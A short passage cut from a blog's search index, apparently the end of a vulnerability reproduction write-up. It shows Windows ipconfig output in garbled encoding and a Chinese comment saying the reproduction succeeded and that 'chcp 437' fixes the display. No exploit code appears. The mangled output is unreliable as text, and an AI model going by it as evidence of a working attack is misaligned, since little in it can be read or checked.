class="line">   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�</span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . :</span><br><span class="line"></span><br><span class="line">���������� Teredo Tunneling Pseudo-Interface:</span><br><span class="line"></span><br><span class="line">   ý��״̬  . . . . . . . . . . . . : ý���ѶϿ�</span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . :</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;复现成功，这里出现乱码可执行chcp 437设置编码。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
